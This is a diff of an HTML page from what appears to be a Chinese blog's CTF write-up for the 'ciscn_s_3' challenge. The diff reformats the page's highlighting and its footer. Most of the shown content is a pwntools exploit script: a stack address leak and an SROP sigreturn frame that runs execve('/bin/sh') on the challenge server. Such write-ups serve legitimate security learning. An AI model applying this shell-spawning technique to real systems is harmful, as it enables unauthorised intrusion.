-<span class="n">payload2</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">mov_rax_15_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">syscall_addr</span><span class="p">)</span> <span class="o">+</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">frame</span><span class="p">)</span>
-
-<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload2</span><span class="p">)</span>
-<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node3.buuoj.cn&#39;</span><span class="p">,</span><span class="mi">26063</span><span class="p">)</span><span class="c1"># process(&#39;./ciscn_s_3&#39;) # </span>
+</span></span><span class="line"><span class="cl"><span class="n">e</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./ciscn_s_3&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">mov_rax_15_ret</span> <span class="o">=</span> <span class="mh">0x4004da</span>
+</span></span><span class="line"><span class="cl"><span class="n">vuln_addr</span> <span class="o">=</span> <span class="mh">0x4004ed</span>
+</span></span><span class="line"><span class="cl"><span class="n">syscall_addr</span> <span class="o">=</span> <span class="mh">0x400517</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload1</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mh">0x10</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">vuln_addr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mh">0x20</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">stack_leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x118</span>
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;stack addr: &#34;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">stack_leak</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">frame</span> <span class="o">=</span> <span class="n">SigreturnFrame</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">frame</span><span class="o">.</span><span class="n">rax</span> <span class="o">=</span> <span class="mh">0x3b</span> <span class="c1"># syscall::execve, constants.SYS_execve is also ok</span>
+</span></span><span class="line"><span class="cl"><span class="n">frame</span><span class="o">.</span><span class="n">rip</span> <span class="o">=</span> <span class="n">syscall_addr</span>
+</span></span><span class="line"><span class="cl"><span class="n">frame</span><span class="o">.</span><span class="n">rdi</span> <span class="o">=</span> <span class="n">stack_leak</span>
+</span></span><span class="line"><span class="cl"><span class="n">frame</span><span class="o">.</span><span class="n">rsi</span> <span class="o">=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl"><span class="n">frame</span><span class="o">.</span><span class="n">rdx</span> <span class="o">=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload2</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">mov_rax_15_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">syscall_addr</span><span class="p">)</span> <span class="o">+</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">frame</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h2 id="0x04-总结">0x04 总结</h2>
 <p>这题从不会，到看懂一种解法，以及查资料、gdb调试、尝试gdb+wsl2+pwntools联合调试、弄wsl ubuntu18、迁移占用c盘空间太多的wsl2-ubuntu20、写博客&hellip;，前前后后搞了差不多一天的时间🤣，一个字，疲惫=.=</p>
@@ -528,8 +528,8 @@ PIE:      No PIE (0x400000)
                 Please enable JavaScript to view the comments powered by <a href="https://valine.js.org/">Valine</a>.
             </noscript></div></article></div>
         </main><footer class="footer">
-        <div class="footer-container"><div class="footer-line">由 <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.89.2">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/HEIGE-PCloud/DoIt" target="_blank" rel="noopener noreffer" title="DoIt 0.2.10"><i class="far fa-edit fa-fw"></i> DoIt</a>
-                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2020 - 2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://github.com/liuliuliuzy" target="_blank" rel="noopener noreferrer">zyleo</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        <div class="footer-container"><div class="footer-line">由 <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.93.1">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/HEIGE-PCloud/DoIt" target="_blank" rel="noopener noreffer" title="DoIt 0.2.10"><i class="far fa-edit fa-fw"></i> DoIt</a>
+                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2020 - 2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://github.com/liuliuliuzy" target="_blank" rel="noopener noreferrer">zyleo</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
         </div></footer></div>
 
     <div id="fixed-buttons"><a href="#back-to-top" id="back-to-top-button" class="fixed-button" title="回到顶部">
